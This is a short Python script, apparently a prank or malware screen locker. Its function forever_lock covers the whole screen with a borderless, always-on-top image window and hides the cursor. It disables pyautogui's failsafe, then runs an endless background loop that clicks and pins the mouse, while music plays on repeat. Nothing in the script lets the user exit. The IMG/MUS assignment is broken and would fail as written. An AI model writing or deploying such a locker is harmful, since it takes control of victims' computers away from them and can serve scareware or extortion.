import pyautogui as g, pygame as p, tkinter as t
from PIL import Image, ImageTk
from threading import Thread

IMG, MUS = r"path"

def forever_lock():
    r = t.Tk()
    r.attributes("-fullscreen", 1, "-topmost", 1)
    r.overrideredirect(True)
    r.config(cursor="none")
    
    i = ImageTk.PhotoImage(Image.open(IMG).resize((r.winfo_screenwidth(), r.winfo_screenheight())))
    t.Label(r, image=i).pack()

    g.FAILSAFE = False
    Thread(target=lambda: [g.click(500,500) or g.moveTo(500, 500) for _ in iter(int, 1)], daemon=1).start()

    try: p.mixer.init(); p.mixer.music.load(MUS); p.mixer.music.play(-1)
    except: pass
    r.mainloop()

forever_lock()
